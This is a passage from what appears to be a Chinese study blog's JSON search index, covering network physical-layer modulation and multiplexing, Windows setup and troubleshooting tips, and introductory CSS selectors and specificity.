\",\"例如，语音数据加载到模拟的载波信号中传输\"]},{\"header\":\"基本调制方法\",\"slug\":\"基本调制方法\",\"contents\":[\"计算机网络-物理层17\",\"调幅AM：所调制的信号由两种不同振幅的基本波形构成。每个基本波形只能表示1比特信息量\",\"调频FM：所调制的信号由两种不同频率的基本波形构成。每个基本波形只能表示1比特信息量\",\"调相PM：所调制的信号由两种不同初相位的基本波形构成。每个基本波形只能表示1比特信息量\",\"但是使用基本调制方法，1个码元只能包含1个比特信息\"]},{\"header\":\"混合调制\",\"slug\":\"混合调制\",\"contents\":[\"因为频率和相位是相关的，即频率是相位随时间的变化率，所以一次只能调制频率和相位两个中的一个，通常情况下，相位和振幅可以结合起来一起调制，称为正交振幅调制QAM\",\"在QAM-16中有12种相位，每种相位有1或2种振幅可选择\",\"由于此调制方法可以调制出16种码元，要完整的表示这16种情况，码元内是二进制数据，因此至少需要4个二进制数，也就是4个比特数据，因此在QAM-16调制方法中，每个码元可以表示4个比特数据\",\"为了防止传输出错导致错误，相邻码元之间的对应关系使用格雷码（相邻二进制数只有一位不同）\"]},{\"header\":\"信道的极限容量\",\"slug\":\"信道的极限容量\",\"contents\":[\"任何实际的信道都不是理想的，在传输信号时会产生各种失真以及带来多种干扰\",\"码元传输的速率越高，或信号传输的距离越远，或传输媒体质量越差，在信道的输出端的波形的失真就越严重\",\"计算机网络-物理层18\",\"失真的原因：\",\"码元传输的速率越高\",\"信号传输的距离越远\",\"噪声干扰越大\",\"传输媒体质量越差\",\"因为以上情况，防止信道数据过大导致码间串扰，因此做出了信号极限容量的预测\",\"其中最著名的就是奈氏准则：\",\"计算机网络-物理层19\",\"由于奈氏准则是一种理想环境下的情况，在实际中极限容量要明显小于该值，就有了香农公式：\",\"计算机网络-物理层20\",\"奈氏准则和香农公式对比：\",\"计算机网络-物理层21\"]},{\"header\":\"信道复用技术\",\"slug\":\"信道复用技术\",\"contents\":[\"复用 (multiplexing) 是通信技术中的基本概念\",\"它允许用户使用一个共享信道进行通信，降低成本，提高利用率\",\"计算机网络-物理层22\"]},{\"header\":\"频分复用\",\"slug\":\"频分复用\",\"contents\":[\"频分复用 FDM (Frequency Division Multiplexing)\",\"将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带\",\"频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）\",\"计算机网络-物理层23\"]},{\"header\":\"时分复用\",\"slug\":\"时分复用\",\"contents\":[\"时分复用TDM (Time Division Multiplexing)\",\"时分复用则是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙\",\"每一个用户所占用的时隙是周期性地出现（其周期就是TDM帧的长度）的\",\"TDM 信号也称为等时 (isochronous) 信号\",\"时分复用的所有用户在不同的时间占用同样的频带宽度\",\"计算机网络-物理层24\",\"时分复用可能会造成线路资源的浪费\",\"使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的\",\"计算机网络-物理层25\"]},{\"header\":\"统计时分复用\",\"slug\":\"统计时分复用\",\"contents\":[\"统计时分复用 STDM (Statistic TDM)\",\"计算机网络-物理层26\"]},{\"header\":\"波分复用\",\"slug\":\"波分复用\",\"contents\":[\"波分复用 WDM(Wavelength Division Multiplexing)\",\"计算机网络-物理层27\"]},{\"header\":\"码分复用\",\"slug\":\"码分复用\",\"contents\":[\"码分复用 CDM (Code Division Multiplexing)\",\"常用的名词是码分多址 CDMA (Code Division Multiple Access)\",\"各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰\",\"这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现\"]}]},\"/computer-network/net-micro-class-notes/\":{\"title\":\"计网微课堂笔记\",\"contents\":[]},\"/computer-usage-skills/optimization/01-%E6%96%B0%E6%9C%BA%E5%BC%80%E8%8D%92%E6%8C%87%E5%8D%97.html\":{\"title\":\"新机开荒指南\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"一个刚装完系统的电脑需要做什么？\",\"安装显卡驱动\",\"关掉系统底部任务栏无用的内容\",\"卸载掉不需要的系统应用\",\"进入设置隐私, 墨迹书写和键入个性化、诊断与反馈、日历联系人、后台应用，全部关掉\",\"开始菜单右键，个性化，选择哪些文件夹显示在“开始”菜单上\",\"进入文件资源管理器，点击上方的查看->选项，在常规中将“打开文件资源管理器时打开”选项改为“此电脑”，在此处可以设置隐私\",\"将系统文件夹中的七个文件夹路径改为 C 盘外的盘（注意命名时最好使用英文）\",\"打开控制面板，打开系统和安全->更改用户账户控制设置->拉到最低\",\"进入设置->系统->存储->更改新内容的保存位置，改成除 C 盘外的其他盘\",\"进入系统服务，禁用无用的服务 \",\"打印假脱机程序 Print Spooler如果您的计算机不使用打印机，可以禁用打印后台处理服务。未使用的可以先禁用，然后在使用时打开\",\"下载地图管理器 Downloaded Maps Manager可以直接禁用下载的地图管理器\",\"视窗防御防火墙 Windows Defender Firewall防火墙，视窗杀毒软件，如果你的电脑安装了第三方杀毒工具，你可以关闭它，如果没有，你最好打开它\",\"远程桌面服务/配置 Remote Desktop Services /Configuration这三项服务与远程桌面相关。如果您在使用遥控功能时通常使用 QQ 或电视，您可以禁用此服务\",\"互联用户体验和遥测 Connected User Experiences and Telemetry该服务是操作系统的微软外围辅助服务。主要用于收集数据，但也有责任收集错误和崩溃信息\",\"诊断执行服务/策略/服务主机系统主机 Diagnostic Execution Service/Policy/Service Host/System Host这四种服务是系统诊断服务，用于支持和执行系统诊断。这些服务会有高 CPU 使用率的问题，可以禁用\",\"传真 Fax目前很少使用的传真服务通常是默认禁用的\",\"智能卡 Smart Card普通用户不使用智能卡服务\",\"触摸键盘和手写面板服务 Touch Keyboard and Handwriting Panel Service触摸键盘和手写面板，非触摸屏用户可以直接禁用笔和墨水功能\",\"净 logo Netlogon此服务使用域控制器来验证您的用户帐户和其他服务，这些服务通常不被独立于家庭的计算机使用，可以直接禁用\"]}]},\"/computer-usage-skills/optimization/02-%E5%88%A0%E9%99%A4%E6%AD%A4%E7%94%B5%E8%84%91%E4%B8%AD%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F.html\":{\"title\":\"删除此电脑中的快捷方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"我们在使用电脑时经常会遇到这种情况，在\\\"此电脑\\\"中出现很多快捷方式，那么怎们删除它们呢？\",\"删除此电脑中的快捷方式.png\",\"直接右键删除\",\"右键删除无效的，使用开源软件 MyComputerManager\",\"还是不行的话，打开注册表，修改注册表，路径为：计算机\\\\HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\MyComputer\\\\NameSpace\\n进入以后删除快捷方式即可\"]}]},\"/computer-usage-skills/optimization/03-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8.html\":{\"title\":\"软件设置开机自启动\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"建议使用任务计划启动\",\"关闭软件的自启动\",\"打开任务计划程序\",\"软件设置开机自启动01.png\",\"选择操作中的创建任务\",\"软件设置开机自启动02.png\",\"输入名称，记得勾上使用最高权限运行\",\"软件设置开机自启动03.png\",\"切换到触发器，新建选择登陆时\",\"软件设置开机自启动04.png\",\"切换到操作，新建启动程序某某某\",\"软件设置开机自启动05.png\",\"设置完成，点击确定即可\"]}]},\"/computer-usage-skills/optimization/\":{\"title\":\"优化设置\",\"contents\":[]},\"/computer-usage-skills/troubleshoot/01-%E6%B8%B8%E6%88%8F%E9%97%AA%E9%80%80%E6%80%8E%E4%B9%88%E5%8A%9E.html\":{\"title\":\"游戏闪退怎么办？\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"检查游戏文件的完整性 \",\"steam 右击游戏属性，本地文件，验证完整性\",\"Quick Fix 检测驱动和系统时间 \",\"检查系统时间是否正确\",\"更新显卡驱动\",\"使用联想 Quick Fix Lenovo Quick Fix：游戏闪退检测工具\",\"3DM 修复 \",\"使用 3DM 离线包修复：3DM游戏运行库合集离线安装包\",\"尝试使用加速器 \",\"推荐使用 steam++（Watt Toolkit）：Watt Toolkit\",\"重启、重装 \",\"重启解决 90%问题\",\"重装解决 99%问题\"]}]},\"/computer-usage-skills/troubleshoot/\":{\"title\":\"疑难解答\",\"contents\":[]},\"/front-end/css-notes/01-%E5%88%9D%E8%AF%86CSS.html\":{\"title\":\"初识CSS\",\"contents\":[{\"header\":\"CSS 简介\",\"slug\":\"css-简介\",\"contents\":[\"CSS 是层叠样式表 ( Cascading Style Sheets ) 的简称，有时我们也会称之为 CSS样式表 或 级联样式表\",\"CSS 也是一种标记语言\",\"CSS 主要用于设置 HTML 页面中的文本内容（字体、大小、对齐方式等）、图片的外形（宽高、边框样式、边距等）以及版面的布局和外观显示样式\",\"CSS 让我们的网页更加丰富多彩，布局更加灵活自如，简单理解：CSS 可以美化 HTML , 让 HTML 更漂亮，让页面布局更简单\",\"CSS 最大价值: 由 HTML 专注去做结构呈现，样式交给 CSS，即结构 ( HTML ) 与样式 ( CSS ) 相分离\"]},{\"header\":\"CSS 的引入方式\",\"slug\":\"css-的引入方式\",\"contents\":[\"按照 CSS 样式书写的位置（或者引入的方式），CSS 样式表可以分为三大类\"]},{\"header\":\"行内样式表（行内式）\",\"slug\":\"行内样式表-行内式\",\"contents\":[\"行内样式表（内联样式表）是在元素标签内部的 style 属性中设定 CSS 样式。适合于修改简单样式\",\"语法：\",\"<div style=\\\"color: red; font-size: 12px;\\\">青春不常在，抓紧谈恋爱</div> \",\"style 其实就是标签的属性，在双引号中间，写法要符合 CSS 规范，是 名：值 的形式\",\"可以控制当前的标签设置样式\",\"由于书写繁琐，并且没有体现出结构与样式相分离的思想，所以不推荐大量使用，只有对当前元素添加简单样式的时候，可以考虑使用\",\"使用行内样式表设定 CSS，通常也被称为行内式引入\"]},{\"header\":\"内部样式表（嵌入式）\",\"slug\":\"内部样式表-嵌入式\",\"contents\":[\"内部样式表（内嵌样式表）是写到 html 页面内部，是将所有的 CSS 代码抽取出来，单独放到一个 <style> 标签中\",\"语法：\",\"<style> div { color: red; font-size: 12px; } </style> \",\"<style> 标签理论上可以放在 HTML 文档的任何地方，但一般会放在文档的 <head> 标签中\",\"通过此种方式，可以方便控制当前整个页面中的元素样式设置\",\"代码结构清晰，但是并没有实现结构与样式完全分离\",\"使用内部样式表设定 CSS，通常也被称为嵌入式引入，这种方式是我们练习时常用的方式\"]},{\"header\":\"外部样式表（链接式）\",\"slug\":\"外部样式表-链接式\",\"contents\":[\"实际开发都是外部样式表，适合于样式比较多的情况，核心是: 样式单独写到 .css 文件中，之后把 .css 文件引入到 HTML 页面中使用\",\"引入外部样式表分为两步：\",\"新建一个后缀名为 .css 的样式文件，把所有 CSS 代码都放入此文件中\",\"在 HTML 页面中，使用 <link> 标签引入这个文件\",\"语法：\",\"<link rel=\\\"stylesheet\\\" href=\\\"css文件路径\\\"> \",\"注意：\",\"<link> 标签要写在 <head> 标签中\",\"标签属性说明： \",\"href ：引入的文档来自于哪里\",\"rel ：( relation，关系）说明引入的文档与当前文档之间的关系\",\"外部样式的优势：样式可以复用、结构清晰、可触发浏览器的缓存机制，提高访问速度，实现了结构与样式的完全分离\",\"实际开发中，几乎都使用外部样式，这是最推荐的使用方式\"]},{\"header\":\"CSS 引入方式总结\",\"slug\":\"css-引入方式总结\",\"contents\":[\"样式表\",\"优点\",\"缺点\",\"使用情况\",\"控制范围\",\"行内样式表\",\"书写方便，权重高\",\"结构样式混写\",\"较少\",\"控制一个标签\",\"内部样式表\",\"部分结构和样式相分离\",\"没有彻底分离\",\"较多\",\"控制一个页面\",\"外部样式表\",\"完全实现结构和样式相分离\",\"需要引入\",\"最多\",\"控制多个页面\"]},{\"header\":\"样式表的优先级\",\"slug\":\"样式表的优先级\",\"contents\":[\"优先级规则：行内样式 > 内部样式 = 外部样式\",\"内部样式、外部样式，这二者的优先级相同，且：后面的会覆盖前面的（简记：“后来者居上”）\",\"同一个样式表中，优先级也和编写顺序有关，且：后面的会覆盖前面的（简记：“后来者居上”）\"]},{\"header\":\"CSS 语法规范\",\"slug\":\"css-语法规范\",\"contents\":[\"CSS 规则由两个主要的部分构成：\",\"选择器：找到要添加样式的元素\",\"声明块：设置具体的样式（声明块是由一个或多个声明组成的），声明的格式为： 属性名: 属性值;\",\"h1{ color:red; font-size:25px; } /*h1是选择器*/ \",\"选择器是用于指定 CSS 样式的 HTML 标签，花括号内是对该对象设置的具体样式\",\"属性和属性值以“键值对”的形式出现\",\"属性是对指定的对象设置的样式属性，例如字体大小、文本颜色等\",\"属性和属性值之间用英文:分开\",\"多个“键值对”之间用英文;进行区分\",\"例如：所有的样式，都包含在 <style> 标签内，表示是样式表。<style> 一般写到 </head> 上方\",\"<head> <style> h4 { color: blue; font-size: 100px; } </style> </head> \",\"注释的写法：\",\"/* 给h1元素添加样式 */ h1{ /* 设置文字颜色为红色 */ color: red; /* 设置文字大小为40px */ font-size: 40px; } \"]},{\"header\":\"CSS 代码风格\",\"slug\":\"css-代码风格\",\"contents\":[\"样式格式书写\",\"紧凑格式（项目上线时推荐，可减小文件体积）\",\"h3 { color: deeppink; font-size: 20px;} \",\"展开格式（开发时推荐，便于维护和调试）\",\"h3 { color: pink; font-size: 20px; } \",\"样式大小写风格\",\"小写格式：\",\"h3 { color: pink; } \",\"大写格式：\",\"H3 { COLOR: PINK; } \",\"强烈推荐样式选择器，属性名，属性值关键字全部使用小写字母，特殊情况除外\",\"样式空格风格\",\"h3 { color: pink; } \",\"属性值前面，冒号后面，保留一个空格，选择器（标签）和大括号中间保留空格\"]}]},\"/front-end/css-notes/02-CSS%E9%80%89%E6%8B%A9%E5%99%A8.html\":{\"title\":\"CSS选择器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"选择器 (选择符)就是根据不同需求把不同的标签选出来，简单来说，就是选择标签用的\"]},{\"header\":\"CSS 基本选择器\",\"slug\":\"css-基本选择器\",\"contents\":[\"基础选择器包括：\",\"通配符选择器\",\"标签（元素）选择器\",\"类选择器\",\"id 选择器\"]},{\"header\":\"通配符选择器\",\"slug\":\"通配符选择器\",\"contents\":[\"作用：可以选中所有的 HTML 元素\",\"语法：\",\"* { 属性名: 属性值; } \",\"例：\",\"* { margin: 0; padding: 0; } \"]},{\"header\":\"标签选择器\",\"slug\":\"标签选择器\",\"contents\":[\"标签选择器（元素选择器）是指用 HTML 标签名称作为选择器，按标签名称分类，为页面中某一类标签指定统一的 CSS 样式\",\"作用：为页面中某种元素统一设置样式\",\"语法：\",\"标签名{ 属性名：属性值 } \",\"例：\",\"/* 选中所有h1元素 */ h1 { color: orange; font-size: 40px; } /* 选中所有p元素 */ p { color: blue; font-size: 60px; } \"]},{\"header\":\"类选择器\",\"slug\":\"类选择器\",\"contents\":[\"如果想要差异化选择不同的标签，单独选一个或者某几个标签，可以使用类选择器\",\"作用：根据元素的 class 值，来选中某些元素\",\"语法：\",\".类名 { 属性名: 属性值; } \",\"例：\",\"/* 选中所有class值为speak的元素 */ .speak { color: red; } /* 选中所有class值为answer的元素 */ .answer { color: blue; } \",\"如果想要差异化选择不同的标签，单独选一个或者某几个标签，可以使用类选择器\",\"类选择器在 HTML 中以 class 属性表示，在 CSS 中，类选择器以一个点号 . 显示\",\"类选择器使用.（英文点号）进行标识，后面紧跟类名（自定义，我们自己命名的）\",\"可以理解为给这个标签起了一个名字，来表示\",\"长名称或词组可以使用中横线来为选择器命名\",\"不要使用纯数字、中文等命名，尽量使用英文字母来表示\",\"命名要有意义，尽量使别人一眼就知道这个类名的目的\",\"注意：\",\"在标签 class 属性中写多个类名\",\"多个类名中间必须用空格分开\",\"这个标签就可以分别具有这些类名的样式\"]},{\"header\":\"id 选择器\",\"slug\":\"id-选择器\",\"contents\":[\"id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式\",\"作用：根据元素的 id 属性值，来精准的选中某个元素\",\"语法：\",\"#id值 { 属性名: 属性值; } \",\"例：\",\"/* 选中id值为earthy的那个元素 */ #earthy { color: red; font-size: 60px; } \",\"注意：\",\"id 属性值：尽量由字母、数字、下划线 _ 、短杠 - 组成，最好以字母开头、不要包含空格、区分大小写\",\"一个元素只能拥有一个 id 属性，多个元素的 id 属性值不能相同\",\"一个元素可以同时拥有 id 和 class 属性\"]},{\"header\":\"选择器总结\",\"slug\":\"选择器总结\",\"contents\":[\"基础选择器\",\"作用\",\"特点\",\"使用情况\",\"用法\",\"标签选择器\",\"可以选出所有相同的标签\",\"不能差异化选择\",\"较多\",\"p{color: red};\",\"类选择器\",\"可以选出 1 个或多个标签\",\"可以根据需求选择\",\"非常多\",\". nav\",\"id 选择器\",\"一次只能选择 1 个标签\",\"ID 属性只能在每个 HTML 文档中出现一次\",\"一般和 js 搭配\",\"# nav\",\"通配符选择器\",\"选择所有的标签\",\"选择的太多，有部分不需要\",\"特殊情况使用\",\"*\"]},{\"header\":\"CSS 复合选择器\",\"slug\":\"css-复合选择器\",\"contents\":[\"在 CSS 中，可以根据选择器的类型把选择器分为基础选择器和复合选择器，复合选择器是建立在基础选择器之上，对基本选择器进行组合形成的\",\"复合选择器是由两个或多个基础选择器，通过不同的方式组合而成的，可以更准确、更高效的选择目标元素（标签）\",\"常用的复合选择器包括：\",\"交集选择器\",\"并集选择器\",\"后代选择器\",\"子元素选择器\",\"兄弟选择器\",\"属性选择器\",\"伪类选择器\",\"伪元素选择器\",\"……\"]},{\"header\":\"交集选择器\",\"slug\":\"交集选择器\",\"contents\":[\"作用：选中同时符合多个条件的元素\",\"语法：\",\"选择器1选择器2选择器3...选择器n { 样式声明 } \",\"例：\",\"/* 选中类名为beauty的p元素，此种写法用的非常多 */ p.beauty { color: blue; } /* 选中：类名包含rich和beauty的元素 */ .rich.beauty { color: green; } \",\"注意：\",\"有标签名，标签名必须写在前面\",\"id 选择器、通配选择器，理论上可以作为交集的条件，但实际应用中几乎不用 —— 因为没有意义\",\"交集选择器中不可能出现两个元素选择器，因为一个元素，不可能即是 p 元素又是 span 元 素\",\"用的最多的交集选择器是：元素选择器配合类名选择器，例如： p.beauty\"]},{\"header\":\"并集选择器\",\"slug\":\"并集选择器\",\"contents\":[\"作用：选中多个选择器对应的元素，又称：分组选择器\",\"语法：\",\"选择器1, 选择器2, 选择器3, ... 选择器n { 样式声明 } \",\"例：\",\"/* 选中id为peiqi，或类名为rich，或类名为beauty的元素 */ #peiqi, .rich, .beauty { font-size: 40px; background-color: skyblue; width: 200px; } \",\"注意：\",\"并集选择器，我们一般竖着写\",\"任何形式的选择器，都可以作为并集选择器的一部分\",\"并集选择器，通常用于集体声明，可以缩小样式表体积\"]},{\"header\":\"基于HTML元素间的关系的选择器\",\"slug\":\"基于html元素间的关系的选择器\",\"contents\":[\"分为：父元素、子元素、祖先元素、后代元素、兄弟元素\",\"父元素：直接包裹某个元素的元素，就是该元素的父元素\",\"CSS选择器01.png\",\"子元素：被父元素直接包含的元素（简记：儿子元素）\",\"CSS选择器02.png\",\"祖先元素：父亲的父亲......，一直往外找，都是祖先（父元素也算是祖先元素的一种）\",\"CSS选择器03.png\",\"后代元素：儿子的儿子......，一直往里找，都是后代（子元素，也算是后代元素的一种）\",\"CSS选择器04.png\",\"兄弟元素：具有相同父元素的元素，互为兄弟元素\",\"CSS选择器05.png\"]},{\"header\":\"后代选择器\",\"slug\":\"后代选择器\",\"contents\":[\"作用：选中指定元素中，符合要求的后代元素\",\"语法：\",\"选择器1 选择器2 选择器3 ...... 选择器n { 样式声明 } /*（先写祖先，再写后代）*/ \",\"语法说明：中间用空格隔开\",\"例：\",\"/* 选中ul中的所有li */ ul li { color: red; } /* 选中ul中所有li中的a */ ul li a { color: orange; } /* 选中类名为subject元素中的所有li */ .subject li { color: blue; } /* 选中类名为subject元素中的所有类名为front-end的li */ .subject li.front-end { color: blue; } \",\"注意：\",\"后代选择器，最终选择的是后代，不选中祖先\",\"儿子、孙子、重孙子，都算是后代\",\"结构一定要符合之前讲的 HTML 嵌套要求，例如：不能 p 中写 h1 ~ h6\"]},{\"header\":\"子代选择器\",\"slug\":\"子代选择器\",\"contents\":[\"作用：选中指定元素中，符合要求的子元素（儿子元素）。（先写父，再写子）\",\"语法：\",\"选择器1 > 选择器2 > 选择器3 > ...... 选择器n { 样式声明 } \",\"例：\",\"/* div中的子代a元素 */ div>a { color: red; } /* 类名为persons的元素中的子代a元素 */ .persons>a{ color: red; } \",\"注意：\",\"子代选择器，最终选择的是子代，不是父级\",\"子、孙子、重孙子、重重孙子 ...... 统称后代！，子就是指儿子\"]},{\"header\":\"兄弟选择器\",\"slug\":\"兄弟选择器\",\"contents\":[]},{\"header\":\"相邻兄弟选择器\",\"slug\":\"相邻兄弟选择器\",\"contents\":[\"作用：选中指定元素后，符合条件的相邻兄弟元素（所谓相邻，就是紧挨着他的下一个）\",\"语法：\",\"选择器1+选择器2 { 样式声明 } \",\"例：\",\"/* 选中div后相邻的兄弟p元素 */ div+p { color:red; } \"]},{\"header\":\"通用兄弟选择器\",\"slug\":\"通用兄弟选择器\",\"contents\":[\"作用：选中指定元素后，符合条件的所有兄弟元素\",\"语法：\",\"选择器1~选择器2 { 样式声明 } \",\"例：\",\"/* 选中div后的所有的兄弟p元素 */ div~p { color:red; } \"]},{\"header\":\"属性选择器\",\"slug\":\"属性选择器\",\"contents\":[\"作用：选中属性值符合一定要求的元素\",\"选择符\",\"简介\",\"E[att]\",\"选择具有 att 属性的 E 元素\",\"E[att=\\\"val\\\"]\",\"选择具有 att 属性且属性值等于 val 的 E 元素\",\"E[att^=\\\"val\\\"]\",\"匹配具有 att 属性且值以 val 开头的 E 元素\",\"E[att$=\\\"val\\\"]\",\"匹配具有 att 属性且值以 val 结尾的 E 元素\",\"E[att*=\\\"val\\\"]\",\"匹配具有 att 属性且值中含有 val 的 E 元素\",\"示例代码：\",\" /* 只选择 type=text 文本框的 input 选取出来 */ input[type=text] { color: pink; } /* 选择首先是 div 然后 具有 class 属性 并且属性值 必须是 icon 开头的这些元素 */ div[class^=icon] { color: red; } /* 选择首先是 section 然后 具有 class 属性 并且属性值 必须是 data 结尾的这些元素 */ section[class$=data] { color: blue; } \",\"属性选择器，按照字面意思，都是根据标签中的属性来选择元素\",\"属性选择器可以根据元素特定属性的来选择元素。这样就可以不用借助于类或者 id 选择器\",\"属性选择器也可以选择出来自定义的属性\"]},{\"header\":\"伪类选择器\",\"slug\":\"伪类选择器\",\"contents\":[\"作用：选中特殊状态的元素\"]},{\"header\":\"动态伪类\",\"slug\":\"动态伪类\",\"contents\":[\":link 超链接未被访问的状态 :visited 超链接访问过的状态 :hover 鼠标悬停在元素上的状态 :active 元素激活的状态 :focus 获取焦点的元素\",\"注意：\",\"激活表示按下鼠标不松开\",\"为了确保生效，请按照 LVHA 的顺序声明 :link － :visited － :hover － :active\",\"表单类元素才能使用 :focus 伪类，当用户点击元素、触摸元素、通过键盘的 tab 键等方法选择元素时，就是获得焦点\"]},{\"header\":\"结构伪类\",\"slug\":\"结构伪类\",\"contents\":[\"结构伪类选择器主要根据文档结构来选择器元素，常用于根据父级选择器里面的子元素\",\"选择符\",\"简介\",\":first-child\",\"所有兄弟元素中的第一个\",\":last-child\",\"所有兄弟元素中的最后一个\",\":nth-child (n)\",\"所有兄弟元素中的第 n 个\",\":first-of-type\",\"所有同类型兄弟元素中的第一个\",\":last-of-type\",\"所有同类型兄弟元素中的最后一个\",\":nth-of-type (n)\",\"所有同类型兄弟元素中的第n个\",\"关于 n 的值：\",\"0 或不写 ：什么都选不中 —— 几乎不用\",\"n ：选中所有子元素 —— 几乎不用\",\"1~正无穷的整数 ：选中对应序号的子元素\",\"2n 或 even ：选中序号为偶数的子元素\",\"2n+1 或 odd ：选中序号为奇数的子元素\",\"-n+3 ：选中的是前 3 个\",\"n 可以是公式\",\"了解即可：\",\":nth-last-child(n) 所有兄弟元素中的倒数第 n 个\",\":nth-last-of-type(n) 所有同类型兄弟元素中的倒数第 n 个\",\":only-child 选择没有兄弟的元素（独生子女）\",\":only-of-type 选择没有同类型兄弟的元素\",\":root 根元素\",\":empty 内容为空元素（空格也算内容）\"]},{\"header\":\"否定伪类\",\"slug\":\"否定伪类\",\"contents\":[\":not(选择器) 排除满足括号中条件的元素\"]},{\"header\":\"UI 伪类\",\"slug\":\"ui-伪类\",\"contents\":[\":checked 被选中的复选框或单选按钮\",\":enable 可用的表单元素（没有 disabled 属性）\",\":disabled 不可用的表单元素（有 disabled 属性）\"]},{\"header\":\"目标伪类\",\"slug\":\"目标伪类\",\"contents\":[\":target 选中锚点指向的元素\"]},{\"header\":\"语言伪类\",\"slug\":\"语言伪类\",\"contents\":[\":lang() 根据指定的语言选择元素（本质是看 lang 属性的值）\"]},{\"header\":\"伪元素选择器\",\"slug\":\"伪元素选择器\",\"contents\":[\"作用：选中元素中的有一些特殊位置\",\"::first-letter 选中元素中的第一个文字 ::first-line 选中元素中的第一行文字 ::selection 选中被鼠标选中的内容 ::placeholder 选中输入框的提示文字 ::before 在元素最开始的位置，创建一个子元素（必须用 content 属性指定内容） ::after 在元素最后的位置，创建一个子元素（必须用 content 属性指定内容）\",\"例：\",\"<style> div { width: 200px; height: 200px; background-color: pink; } /* div::before 权重是2 */ div::before { /* 这个content是必须要写的 */ content: '我'; } div::after { content: '小猪佩奇'; } </style> <body> <div> 是 </div> </body> \",\"注意：\",\"before 和 after 创建一个元素，但是属于行内元素\",\"新创建的这个元素在文档树中是找不到的，所以我们称为伪元素\",\"语法：element::before {}\",\"before 和 after 必须有 content 属性\",\"before 在父元素内容的前面创建元素，after 在父元素内容的后面插入元素\"]},{\"header\":\"选择器的优先级\",\"slug\":\"选择器的优先级\",\"contents\":[\"通过不同的选择器，选中相同的元素，并且为相同的样式名设置不同的值时，就发生了样式的冲突。到底应用哪个样式，此时就需要看优先级了\"]},{\"header\":\"简单描述\",\"slug\":\"简单描述\",\"contents\":[\"行内样式 > ID 选择器 > 类选择器 > 元素选择器 > 通配选择器\"]},{\"header\":\"详细描述\",\"slug\":\"详细描述\",\"contents\":[\"计算方式：每个选择器，都可计算出一组权重，格式为： (a,b,c)\",\"a : ID 选择器的个数\",\"b : 类、伪类、属性选择器的个数\",\"c : 元素、伪元素选择器的个数\",\"例：\",\"选择器\",\"权重\",\"ul>li\",\"(0,0,2)\",\"div ul>li p a span\",\"(0,0,6)\",\"#a .slogan\",\"(1,1,0)\",\"#a .slogan a\",\"(1,1,1)\",\"#a .slogan a:hover\",\"(1,2,1)\",\"比较规则：按照从左到右的顺序，依次比较大小，当前位胜出后，后面的不再对比\",\"例：\",\"(1,0,0) > (0,2,2)\",\"(1,1,0) > (1,0,3)\",\"(1,1,3) > (1,1,2)\",\"特殊规则：\",\"行内样式权重大于所有选择器\",\"!important 的权重，大于行内样式，大于所有选择器，权重最高！\",\"图示：\",\"CSS选择器06.png\"]}]},\"/front-end/css-notes/03-CSS%E4%B8%89%E5%A4%A7%E7%89%B9%E6%80%A7.html\":{\"title\":\"CSS三大特性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 有三个非常重要的三个特性：层叠性、继承性、优先级\"]},{\"header\":\"层叠性\",\"slug\":\"层叠性\",\"contents\":[\"相同选择器给设置相同的样式，此时一个样式就会覆盖（层叠）另一个冲突的样式，层叠性主要解决样式冲突的问题\",\"层叠性原则:\",\"样式冲突，遵循的原则是就近原则，哪个样式离结构近，就执行哪个样式，即后面的样式会覆盖掉前面的样式\",\"样式不冲突，不会层叠\"]},{\"header\":\"继承性\",\"slug\":\"继承性\",\"contents\":[\"CSS 中的继承: 子标签会继承父标签的某些样式\",\"规则：优先继承离得近的\",\"恰当地使用继承可以简化代码，降低 CSS 样式的复杂性\",\"常见的可继承属性：text-??，font-??，line-??，color\"]},{\"header\":\"优先级\",\"slug\":\"优先级\",\"contents\":[\"!important > 行内样式 > ID 选择器 > 类选择器 > 元素选择器 > * > 继承的样式\"]}]},\"/front-end/css-notes/04-CSS%E9%95%BF%E5%BA%A6%E5%92%8C%E9%A2%9C%E8%89%B2.html\":{\"title\":\"CSS长度和颜色\",\"contents\":[{\"header\":\"长度\",\"slug\":\"长度\",\"contents\":[]},{\"header\":\"像素\",\"slug\":\"像素\",\"contents\":[\"像素（px）是指由图像的小方格组成的，这些小格都有一个明确的位置和被分配的色彩数值，小方格颜色和位置就决定该图像所呈现出来的样子\",\"可以将像素视为整个图像中不可分割的单位或者是元素。不可分割的意思是它不能够再切割成更小单位抑或是元素，它是以一个单一颜色的小格存在。每一个点阵图像包含了一定量的像素，这些像素决定图像在屏幕上所呈现的大小，也就是说，显示器屏幕实际上是由一个一个的小点（单位色块，即像素）构成的\"]},{\"header\":\"屏幕分辨率\",\"slug\":\"屏幕分辨率\",\"contents\":[\"例如，屏幕分辨率是1920×1080，则该屏幕水平方向有1920个像素，垂直方向有1080个像素\",\"不同屏幕的像素大小是不同的，也就是说像素大小不像我们现行的长度单位（如米/m）那样有着固定的国际标准\",\"所以同样的像素大小在不同的设备上显示效果是不一样的，像素越小的屏幕显示的效果越清晰\"]},{\"header\":\"图像分辨率\",\"slug\":\"图像分辨率\",\"contents\":[\"例如，一张图片分辨率是300x200，则该图片在屏幕上按1:1缩放时，水平方向有300个像素，垂直方向有200个像素点\",\"图片分辨率越高，1:1缩放时面积越大\",\"图片分辨率越低，1:1缩放时面积越小\",\"同一台设备像素大小是不变的，那把图片放大超过100%时占的像素点就多了，但是图像也会变得模糊\"]},{\"header\":\"百分比\",\"